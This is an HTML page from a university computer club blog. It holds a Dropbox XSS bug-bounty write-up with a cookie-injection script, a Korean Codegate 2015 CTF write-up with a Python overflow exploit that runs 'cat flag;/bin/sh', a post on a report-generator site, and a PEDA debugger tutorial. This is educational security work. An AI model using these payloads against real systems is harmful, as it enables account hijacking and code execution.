<!doctype html>
<html class="theme-next use-motion theme-next-mist">
<head>
  
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
  <link href='//fonts.googleapis.com/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext' rel='stylesheet' type='text/css'>
<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.5.1"/>
    <meta name="description" content="UNIST Computer Club. Hacker's eXciting Academy" />
    <meta property="og:image" content="https://raw.githubusercontent.com/HeXA-UNIST/hexa-blog/master/source/img/hexa_logo.png" />
  <meta name="keywords" content="HeXA,UNIST" />
  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1" />

<meta name="description" content="UNIST Computer Club. Hacker&apos;s eXciting Academy">
<meta property="og:type" content="website">
<meta property="og:title" content="HeXA | UNIST Computer Club">
<meta property="og:url" content="http://hexa-unist.github.io/index.html">
<meta property="og:site_name" content="HeXA | UNIST Computer Club">
<meta property="og:description" content="UNIST Computer Club. Hacker&apos;s eXciting Academy">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="HeXA | UNIST Computer Club">
<meta name="twitter:description" content="UNIST Computer Club. Hacker&apos;s eXciting Academy">


<script type="text/javascript" id="hexo.configuration">
  var CONFIG = {
    scheme: 'Mist',
    sidebar: 'hide'
  };
</script>

  <title> HeXA | UNIST Computer Club </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">
  <!--[if lte IE 8]>
  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
           style='margin-left:auto;margin-right:auto;display: block;'/>
    </a>
  </div>
<![endif]-->

  <div class="container one-column 
   page-home 
">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><h1 class="site-meta">
  <span class="logo-line-before"><i></i></span>
  <a href="/" class="brand" rel="start">
      <span class="logo">
        <i class="icon-next-logo"></i>
      </span>
      <span class="site-title">Kim Mingyu</span>
  </a>
  <span class="logo-line-after"><i></i></span>
</h1>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
    <ul id="menu" class="menu ">
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            <i class="menu-item-icon icon-next-home"></i> <br />
            Home
          </a>
        </li>
    </ul>
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div id="content" class="content"> 
  <section id="posts" class="posts-expand">

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
              <a class="post-title-link" href="/2015/08/04/XSS-subdomain-escape-wirte-up-on-Dropbox/" itemprop="url">
                XSS subdomain escape wirte up (on Dropbox)
              </a>
        </h1>
      <div class="post-meta">
        <span class="post-time">
          Posted on
          <time itemprop="dateCreated" datetime="2015-08-04T22:57:30+09:00" content="2015-08-04">
            2015-08-04
          </time>
        </span>

        

        
          
            <span class="post-comments-count">
            &nbsp; | &nbsp;
            <a href="/2015/08/04/XSS-subdomain-escape-wirte-up-on-Dropbox/#comments" itemprop="discussionUrl">
              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/08/04/XSS-subdomain-escape-wirte-up-on-Dropbox/" itemprop="commentsCount"></span>
            </a>
          </span>
          
        
      </div>
    </header>

    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody"><h2 id="Beginning">Beginning</h2><p>First, I think many people know that a html file uploaded on dropbox shows with rendering, and without any escaping. It means that, if we write down a JavaScript code to the html file, we can easily execute a JavaScript code on the html page without any problem. But, the script is executed on a sandbox domain, dl-web.dropbox.com. The important session is a httponly cookie, so we can’t easily steal the user session.</p>
<p align="center"> <img src="/img/dropbox1.png" style="width: 60%;"> </p>

<p>In this situation, I can set any cookie on dropbox.com domain (not www.dropbox.com). It means that it may be able to influence on www.dropbox.com. If main dropbox page do something using the cookie on dropbox.com, then maybe I can do something on www.dropbox.com </p>
<h2 id="Vulnerability">Vulnerability</h2><p>I found a some nice thing, Flash. After cookies, “flash” and “bang”, are given, dropbox page draws a pop-up box which is containing a text in “flash”. But, “bang” was a problem. It seems like a hmac of “flash”. So, I need to find “bang” value of my custom “flash”.</p>
<p>I also found a function which unlinks device in security setting page. If I unlink a some device, then it shows me a flash message, which is containing device name. So, I set the device name (iphone name) to a XSS text, and I unlinked it. </p>
<h2 id="Exploit">Exploit</h2><p><img src="/img/dropbox2.png" alt=""></p>
<p>Now, I can set “flash” and “bang” value to any text.</p>
<p><img src="/img/dropbox3.png" alt=""></p>
<p>Then, set the malicious cookie in a html. After that, make victim to move page to www.dropbox.com (trigger flash message).</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">document.cookie="bang=QUFEZGthYS1CaTNfWUpYcDUwdjNxemVHSHlhSHJkU3BEdnhKRUxOZVZ3b2ZoUQ%3D%3D;</span><br><span class="line">Domain=dropbox.com; Path=/;";</span><br><span class="line">document.cookie="flash=b2s6PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KGRvY3VtZW50LmRvbWFpbik%2BIHVubGlua</span><br><span class="line">2VkIHN1Y2Nlc3NmdWxseS4%3D; Domain=dropbox.com; Path=/";</span><br><span class="line">location.href="https://dropbox.com/forgot";</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>There is a CSP. But, the script is executed on IE or Safari.</p>
<p align="center"> <img src="/img/dropbox4.png" style="width: 80%;"> </p>

<p>+) Currently, common XSS on dl-web.dropbox.com is out of scope for bounty.<br>+) Now, I think a flash depends on only one session. </p>
<p>2015/05/02 Fixed, A bounty of $1,331</p>
<p>Author: <a href="http://blog.tunz.kr/" target="_blank" rel="external">tunz</a></p>
</span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <header class="post-header">

      
      
        <h1 class="post-title" itemprop="name headline">
          
          
            
              <a class="post-title-link" href="/2015/04/06/Codegate-2015-systemshock/" itemprop="url">
                Codegate 2015 - systemshock
              </a>
            
          
        </h1>
      

      <div class="post-meta">
        <span class="post-time">
          Posted on
          <time itemprop="dateCreated" datetime="2015-04-06T12:20:08+09:00" content="2015-04-06">
            2015-04-06
          </time>
        </span>

        

        
          
            <span class="post-comments-count">
            &nbsp; | &nbsp;
            <a href="/2015/04/06/Codegate-2015-systemshock/#comments" itemprop="discussionUrl">
              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/04/06/Codegate-2015-systemshock/" itemprop="commentsCount"></span>
            </a>
          </span>
          
        
      </div>
    </header>

    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody"><p>200점짜리 문제로, 많은 팀들이 가장먼저 푼 문제입니다. </p>
<p>문제가 나오고 정말빨리 풀렸는데, 저는 처음에 문제 제목에 현혹되어 <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)" target="_blank" rel="external">shellshock</a>인줄 알고 헤메느라 시간이 많이 걸렸네요… ㅠㅠ<br>실제로 당황스럽게도 대회 서버에서 <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)#CVE-2014-6277" target="_blank" rel="external">CVE-2014-6277</a>이 먹혔더라죠… ;;</p>
<p>하지만 차분히 생각해보면 <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)" target="_blank" rel="external">shellshock</a>는 <code>setuid</code>가 걸려있는 바이너리안에서 <code>bash</code>를 호출해야한다는 점과 환경변수를 필요로 한다는점을 생각해보면 이 문제에서는 <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)" target="_blank" rel="external">shellshock</a>를 사용할 수 없다는걸 바로 알 수 있습니다.</p>
<p>이걸 생각못해서 날린 시간이 몇시간인지.. 흙흙</p>
<p>여튼, 이 문제는 <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)" target="_blank" rel="external">shellshock</a>를 이용해서 푸는 문제가 아닌 strcat을 이용한 단순한 오버플로우 문제입니다. 제대로 된 풀이만 바로 떠올리면 정말 빨리 풀 수 있는 문제이지요… 실제로 문제가 나오자마자 엄청 빠른 속도로 풀린 문제이기도 합니다.</p>
<p>그럼 각설하고 풀이로 들어가보도록 하겠습니다!</p>
<h2 id="문제환경">문제환경</h2><p align="center"> <img src="/img/systemshock1.png" style="width: 90%;"> </p>

<p>오호 정확히 <code>strlen</code>의 인자로 넣어준 A들이 들어간것을 볼 수 있습니다.</p>
<p>그럼 이제 해야할것은 <code>argv[1]</code>의 포인터를 덮어씌우기 위해 앞에 몇개의 A를 넣어줘야하는지와 어떤 값으로 덮어써야할지를 정하면 되겠습니다.</p>
<p>어떤값으로 덮어써야할지는 비어있는 문자열 즉 null이 들어있는 주소로 덮어주면 됩니다. 그러면 <code>strlen</code>의 리턴값이 0이 되고, 입력값 검사를 우회할수 있게 됩니다. 그런데 여기서 또 생각해 줘야할 부분이 서버에는 ASLR이 걸려있어 주소들이 랜덤이고 32비트가 아니라 ulimit -s unlimited 같은 꼼수도 못부립니다 ㅠㅠ.. 하지만! 64비트에도 고정인 주소가 있으니… 바로 그부분은 vsyscall 영역입니다.</p>
<p align="center"> <img src="/img/systemshock2.png" style="width: 80%;"> </p>

<p>끝부분에 보이는 </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffffff600000</span>    <span class="number">0xffffffffff601000</span> r-xp      [vsyscall]</span><br></pre></td></tr></table></figure>
<p>부분은 ASLR이 걸려있더라도 고정인 주소로 매핑됩니다. 그렇다면 이 vsyscall 영역에 null이 들어있는 주소가있다면?! 그 주소로 <code>strlen</code>의 인자, 즉 argv[1]의 포인터를 덮어씌우면 끝나게 됩니다.</p>
<p>그러면 이제 이 vsyscall 영역에 null문자열이 있는지 한번 찾아봅시다.</p>
<p align="center"> <img src="/img/systemshock3.png" style="width: 90%;"> </p>

<p>찾는방법은 여러가지 있겠으나 저는 peda의 searchmem 기능을 이용하여 찾았습니다.<br>vsyscall 영역에서 null(0x00) 으로 찾으니 꽤 많이 나오는데 이 중에서 값의 중간에 0x00 널값이 포함안되는 값으로 아무거나 하나 정해주면됩니다.</p>
<p>null이 들어가면 안되는 이유는 문제 바이너리를 실행할때 인풋을 argv[1]로 넘겨주는데 이 argv[1]은 중간에 null값이 들어갈 수 없기 때문입니다. ( null 값이 들어가면 null뒤의 값들은 짤립니다.. ㅠㅠ )</p>
<p>여튼 그럼 저는 적당히 0xffffffffff600405 로 골라서 하도록 하겠습니다.</p>
<p>이제 남은일은 앞에 더미값인 A를 몇개나 입력해줘야하는가 인데, 자세히 분석해서 알아낼 수도 있겠지만 대회 특성상 문제를 빨리풀어야하는걸 고려해서 peda의 pattern 명령어를 사용하여 자세히 분석하지 않고도 쉽게 알아낼수 있는 방법을 쓰도록 하겠습니다.</p>
<p align="center"> <img src="/img/systemshock4.png" style="width: 85%;"> </p>

<p>pattern create 1024 pattern.txt 를 입력하면 pattern.txt 라는 파일에 1024개의 패턴 문자가 쓰여지게 됩니다.<br>그리고 실행할때 r <code>cat pattern.txt</code> 로 실행을 하면 방금 만든 pattern 값들을 argv[1]로 넘기면서 실행할 수 있습니다.</p>
<p>이렇게 실행을 하면,</p>
<p align="center"> <img src="/img/systemshock5.png" style="width: 85%;"> </p>

<p>이렇게 <code>strlen</code>의 인자가 패턴값으로 덮힌것을 알 수 있습니다.</p>
<p>이상태에서 pattern.txt 파일을 열어 ANsA8sAi 의 문자열을 찾아 ( 리틀엔디안이므로 문자열을 뒤집은 것입니다. ) 이 문자열앞의 문자 갯수를 python len 함수같은것을 이용하여 세어봐도 되고, peda의 pattern search 라는 기능을 이용해도 됩니다.</p>
<p align="center"> <img src="/img/systemshock6.png" style="width: 85%;"> </p>

<p>pattern search를 해보면 offset이 525로 나오는데 이게 우리가 구할 offset과 일치합니다.</p>
<p>이렇게 offset을 구했으니 “A” 525개 + “B” 8개 를 넣어서 offset이 맞는지 한번 확인해보도록 하겠습니다.</p>
<p align="center"> <img src="/img/systemshock7.png" style="width: 90%;"> </p>

<p><code>strlen</code>에 breakpoint를 걸은후, <code>perl -e&#39;print&quot;A&quot;x525, &quot;B&quot;x8&#39;</code> 로 실행시키면 정확히 <code>strlen</code>의 인자로 BBBBBBBB가 들어가는것을 볼 수 있습니다.</p>
<p>그럼 이제 BBBBBBBB 부분 대신에 아까 구해준 null이 들어있는 주소,  0xffffffffff600405 으로 대신 넣어주고 “A”525개에 A만 넣는게 아니라 실행시킬 명령어도 포함시켜 주면 입력값 검사를 안받게되고 임의의 명령어를 실행시킬수 있게 됩니다.</p>
<h2 id="Exploit_Code">Exploit Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exploit.py</span></span><br><span class="line"><span class="comment"># ./shock "`cat payload`"</span></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"payload"</span>, <span class="string">"w"</span>)</span><br><span class="line"></span><br><span class="line">null_addr=<span class="number">0xffffffffff600405</span></span><br><span class="line">cmd=<span class="string">"HACKED;cat flag;/bin/sh;#"</span></span><br><span class="line"></span><br><span class="line">payload = cmd + <span class="string">"A"</span>*(<span class="number">525</span>-len(cmd))</span><br><span class="line">payload+= pack(<span class="string">"&lt;Q"</span>, null_addr)</span><br><span class="line"></span><br><span class="line">f.write(payload)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p><img src="/img/systemshock8.png" alt=""></p>
<p>궁금한부분이 있거나 수정할 부분이 있으면 언제든 말해주세요!</p>
<p>작성자: <a href="https://github.com/L34p/" target="_blank" rel="external">l34p</a></p>
</span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <header class="post-header">

      
      
        <h1 class="post-title" itemprop="name headline">
          
          
            
              <a class="post-title-link" href="/2015/02/27/club-auto-system/" itemprop="url">
                동아리 활동 내역서 자동 생성 사이트
              </a>
            
          
        </h1>
      

      <div class="post-meta">
        <span class="post-time">
          Posted on
          <time itemprop="dateCreated" datetime="2015-02-27T21:15:00+09:00" content="2015-02-27">
            2015-02-27
          </time>
        </span>

        

        
          
            <span class="post-comments-count">
            &nbsp; | &nbsp;
            <a href="/2015/02/27/club-auto-system/#comments" itemprop="discussionUrl">
              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/02/27/club-auto-system/" itemprop="commentsCount"></span>
            </a>
          </span>
          
        
      </div>
    </header>

    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody"><p>많은 양의 활동보고서를 일일히 수정해서 쓰는 것에 불편함을 느껴, 날짜/활동내용/참가자 명단 등을 입력하면 자동으로 보고서를 만들어주는 사이트를 만들었습니다.</p>
<p align="center"> <img src="/img/club-auto-system1.png" style="width: 70%;"> </p>

<p>먼저, 다음과 같이 내용을 작성하고 사진을 업로드 합니다.<br>그 후 Upload 버튼을 누르면,</p>
<p align="center"> <img src="/img/club-auto-system2.png" style="width: 60%;"> </p>

<p>위 사진처럼 파일을 다운받을 수 있게 됩니다.</p>
<p align="center"> <img src="/img/club-auto-system3.png" style="width: 60%;"> </p>

<p>위에 적었던 내용들이 다음과 같이 폼에 들어가 작성되며, 사진 또한 크기에 맞춰서 들어갑니다.</p>
<p align="center"> <img src="/img/club-auto-system4.png" style="width: 60%;"> </p>

<p>출결 여부를 체크하지 않은 사람은 불참으로 기록되며, 출석 인원에서 제외됩니다.<br>파이썬으로 작성했으며, Flask를 사용했습니다.</p>
<p><a href="https://github.com/fresh-mango-tree/Activity-Report-Factory" target="_blank" rel="external">code</a></p>
<p>작성자: <a href="http://freshmangotree.tistory.com/" target="_blank" rel="external">fresh-mango-tree</a></p>
</span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <header class="post-header">

      
      
        <h1 class="post-title" itemprop="name headline">
          
          
            
              <a class="post-title-link" href="/2015/02/26/PEDA-How-To-Use/" itemprop="url">
                PEDA - How To Use
              </a>
            
          
        </h1>
      

      <div class="post-meta">
        <span class="post-time">
          Posted on
          <time itemprop="dateCreated" datetime="2015-02-26T00:17:00+09:00" content="2015-02-26">
            2015-02-26
          </time>
        </span>

        

        
          
            <span class="post-comments-count">
            &nbsp; | &nbsp;
            <a href="/2015/02/26/PEDA-How-To-Use/#comments" itemprop="discussionUrl">
              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/02/26/PEDA-How-To-Use/" itemprop="commentsCount"></span>
            </a>
          </span>
          
        
      </div>
    </header>

    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody"><p>이번 포스팅에서는 PEDA에는 어떤 기능들이 있는지, 실제로 어떤식으로 활용할 수 있는지에 대해 살펴보도록 하겠습니다.</p>
<h2 id="PEDA_기본_인터페이스">PEDA 기본 인터페이스</h2><p align="center"> <img src="/img/peda-how-to1.png" style="width: 80%;"> </p>

<p>우선 PEDA의 기본적인 화면은 위와 같습니다.</p>
<p>display 같은 걸 해주지 않으면 기본적으로 화면에 아무것도 안 나오는 gdb와 달리 PEDA는 기본적으로 현재 레지스터의 상태와 실행 중인 명령어와 그 주변 명령어들, 스택의 내용물 등을 표시해줍니다.</p>
<p>특히나 정말 멋진 기능 중 하나는 포인터를 따라가서 그 내용물까지 보여주는 기능입니다.<br>위 그림에서 레지스터 부분이나 스택 부분을 보면 포인터를 따라가서 그 안의 내용까지 보여주는 걸 볼 수 있습니다. PEDA 짱짱맨!!</p>
<p>그러면 이제 PEDA의 다양한 기능들을 하나씩 하나씩 들여다보겠습니다.</p>
<h2 id="pdisas">pdisas</h2><p align="center"> <img src="/img/peda-how-to2.png" style="width: 80%;"> </p>

<p>pdisas는 gdb에서 쓰던 disas 명령어의 확장판입니다.</p>
<p>위 그림을 보면 알 수 있듯이 pdisas를 사용하면 알록달록한! 컬러풀한! 가독성이 더 높아진 버전의 disas 결과물을 볼 수 있습니다. PEDA는 gdb의 확장이므로 물론 원래 gdb의 기능들도 모두 사용 가능합니다. 그래서 pdisas 와 disas를 위 그림처럼 비교해보면 확실히 pdisas가 컬러링이 잘 돼있어 가독성이 높은 걸 알 수 있습니다.</p>
<h3 id="How_to_use">How to use</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pdisas <span class="string">"Function Name"</span></span><br></pre></td></tr></table></figure>
<h3 id="Example">Example</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pdisas main</span><br></pre></td></tr></table></figure>
<h2 id="context_code_/_register_/_stack">context code / register / stack</h2><p align="center"> <img src="/img/peda-how-to3.png" style="width: 80%;"> </p>

<p>context 명령어는 별다른 기능이 아니라 맨 처음에 보여드렸던 PEDA 기본인터페이스 에서 code영역 register영역 stack영역을 따로 따로 볼 수 있는 기능입니다.</p>
<h3 id="How_to_use-1">How to use</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ context <span class="string">"code/register/stack/all"</span> ( context 만 입력시엔 context all 과 같습니다. )</span><br></pre></td></tr></table></figure>
<h3 id="Example-1">Example</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ context</span><br><span class="line">gdb-peda$ context code</span><br><span class="line">gdb-peda$ context all</span><br></pre></td></tr></table></figure>
<h2 id="session_save_/_restore">session save / restore</h2><p align="center"> <img src="/img/peda-how-to4.png" style="width: 80%;"> </p>

<p>session 명령어! 정말 편리한 기능을 제공하는 명령어입니다.<br>기존 gdb에서는 열심히 분석하면서 break point도 걸어놓고 watch point도 걸어놓고 해 놓더라도 gdb를 껐다 다시 키면 전부 없어지는데 peda에서는 session이라는 명령어로 break point와 같은 설정들을 저장하고 불러오는게 가능합니다.</p>
<p>위 그림에서도 맨 처음에 info b 를 했을때, “No breakpoints or watchpoints” 가 나오는데 session restore 명령어를 치고 난 후 info b 를 해보면 저장해 놓았던 설정들을 그대로 가져오는 것을 볼 수 있습니다. </p>
<h3 id="How_to_use-2">How to use</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ session save <span class="string">"파일이름"</span> ( 파일이름 생략시엔 peda-session-<span class="string">"실행파일이름"</span>.txt 로 저장 )</span><br><span class="line">gdb-peda$ session restore <span class="string">"파일이름"</span> ( 파일이름 생략시엔 peda-session-<span class="string">"실행파일이름"</span>.txt 로드 )</span><br></pre></td></tr></table></figure>
<h3 id="Example-2">Example</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ session save</span><br><span class="line">gdb-peda$ session restore</span><br><span class="line">gdb-peda$ session save MySession</span><br><span class="line">gdb-peda$ session restore MySession</span><br></pre></td></tr></table></figure>
<h2 id="snapshot_save_/_restore">snapshot save / restore</h2><p>이것도 상당히 재밌는 기능인데, session 이 break point나 watch point 들을 저장하고 불러온다면 이 명령어는 아예 현재 디버깅중인 프로세스의 스냅샷을 찍어 저장하고 불러올수있게 합니다. 사용법은 session과 동일합니다.</p>
<h2 id="vmmap">vmmap</h2><p align="center"> <img src="/img/peda-how-to5.png" style="width: 80%;"> </p>


<p>이 명령어는 현재 디버깅 중인 프로세스의 Virtual Memory MAP을 보여줍니다.<br>그냥 vmmap 만 입력할 시에는 vmmap all 과 같으며 위 그림과 같이 vmmap binary, vmmap stack 이런 식으로 특정 메모리 영역만 볼 수도 있습니다.</p>
<p>원래 gdb로 했었더라면 현재 프로세스의 pid를 알아내고 shell cat /proc/“pid”/maps 를 해서 봐야 했을 텐데 PEDA를 사용하면 아주 간단하게 메모리 매핑 상태를 보는 게 가능합니다.</p>
<p>여기서 추가적으로 더 나아가서 얘기하자면, vmmap stack을 사용해서 현재 stack의 권한을 보고 해당 바이너리가 NX가 걸렸는지 안 걸렸는지도 알 수 있습니다.</p>
<h3 id="How_to_use-3">How to use</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ vmmap <span class="string">"all/binary/libc/stack/ld ..."</span> ( 인자를 생략할 시에는 vmmap all 과 같습니다. )</span><br></pre></td></tr></table></figure>
<h3 id="Example-3">Example</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ vmmap</span><br><span class="line">gdb-peda$ vmmap libc</span><br><span class="line">gdb-peda$ vmmap stack</span><br></pre></td></tr></table></figure>
<h2 id="checksec">checksec</h2><p align="center"> <img src="/img/peda-how-to6.png" style="width: 80%;"> </p>

<p>이 명령어는 현재 바이너리에 걸려있는 보안 기법들을 보여줍니다. 사용법은 간단히 그냥 checksec을 입력하기만 하면됩니다. 근데 여기서 주의해야 할 게 다른 건 몰라도 여기서 표시되는 NX는 별로 신뢰하지 않는 게 좋습니다. 버그가 있는지는 몰라도 NX가 안 걸려있는데 걸려있다고 나온다던가… 이런 경우가 몇 번 있어서 통수 맞은 적이 있네요 ㅠㅠ</p>
<p>그래서 밑에서 소개할 nxtest 라는 명령어 또는 vmmap stack과 같은 명령어로 다른방법을  사용해서 NX는 따로 체크해주시는게 좋을 것 같습니다.  </p>
<h3 id="How_to_use-4">How to use</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br></pre></td></tr></table></figure>
<h2 id="nxtest">nxtest</h2><p align="center"> <img src="/img/peda-how-to7.png" style="width: 80%;"> </p>


<p>nxtest는 말그대로 NX 가 걸려있는지 테스트 해주는 명령어로 스택에 실행권한이 있는지 체크합니다. </p>
<h3 id="How_to_use-5">How to use</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ nxtest</span><br></pre></td></tr></table></figure>
<h2 id="procinfo_/_getpid">procinfo / getpid</h2><p align="center"> <img src="/img/peda-how-to8.png" style="width: 80%;"> </p>

<p>procinfo 는 현재 디버깅중인 프로세스의 정보를 위 그림과 같이 표시해 줍니다.<br>pid만 필요하다면 getpid 명령어를 사용하는걸로 pid만 얻을수도 있습니다.</p>
<h3 id="How_to_use-6">How to use</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ procinfo</span><br><span class="line">gdb-peda$ getpid</span><br></pre></td></tr></table></figure>
<h2 id="elfsymbol">elfsymbol</h2><p align="center"> <img src="/img/peda-how-to9.png" style="width: 80%;"> </p>


<p>이게 또 참 편리한 기능인데, elfsymbol이라는 명령어로 현재 디버깅 중인 바이너리의 plt 주소, got 주소 등을 알 수 있습니다. exploit 코드를 작성할 때 got overwrite을 한다거나 got 주소를 leak 시켜온다거나 여러 가지의 상황에서 plt 주소와 got 주소가 필요한 경우가 종종 있는데 이럴때 elfsymbol 명령어를 이용하면 아주 쉽게 정보를 얻을 수 있습니다.</p>
<h3 id="How_to_use-7">How to use</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ elfsymbol <span class="string">"symbol"</span> ( 인자를 생략하면 symbol들을 모두 보여줍니다. )</span><br></pre></td></tr></table></figure>
<h3 id="Example-4">Example</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ elfsymbol</span><br><span class="line">gdb-peda$ elfsymbol <span class="built_in">printf</span></span><br></pre></td></tr></table></figure>
<h2 id="elfheader">elfheader</h2><p align="center"> <img src="/img/peda-how-to10.png" style="width: 80%;"> </p>

<p>elfheader 명령어는 현재 디버깅 중인 바이너리의 헤더 정보들을 보여줍니다. 이 기능도 exploit 코드를 작성할 때 종종 bss 영역의 주소가 필요하다거나 하는 경우가 있는데 이럴 때 사용하면 유용합니다.</p>
<h3 id="How_to_use-8">How to use</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ elfheader</span><br></pre></td></tr></table></figure>
<h3 id="Example-5">Example</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ elfheader</span><br><span class="line">gdb-peda$ elfheader .bss</span><br></pre></td></tr></table></figure>
<h2 id="find_/_searchmem">find / searchmem</h2><p align="center"> <img src="/img/peda-how-to11.png" style="width: 80%;"> </p>

<p>find와 searchmem 은 동일한 명령어로 아무거나 선호하는 걸로 사용하시면 되며, 이 명령어는 메모리 영역에서 특정 패턴을 찾아줍니다.<br>다양한 방법으로 응용될 수 있는데, 몇가지 예시를 들자면 위 그림과 같이 /bin/sh 문자열의 주소를 찾는다던가 특정 OPCODE를 메모리에서 찾는다던가 하는게 가능합니다.</p>
<h3 id="How_to_use-9">How to use</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ find/searchmem <span class="string">"pattern"</span> <span class="string">"범위"</span> ( 범위부분을 생략하면 binary 영역으로 세팅 됩니다.)</span><br></pre></td></tr></table></figure>
<h3 id="Example-6">Example</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ find /bin/sh libc</span><br></pre></td></tr></table></figure>
<h2 id="ropgadget_/_ropsearch_/_dumprop">ropgadget / ropsearch / dumprop</h2><p align="center"> <img src="/img/peda-how-to12.png" style="width: 80%;"> </p>

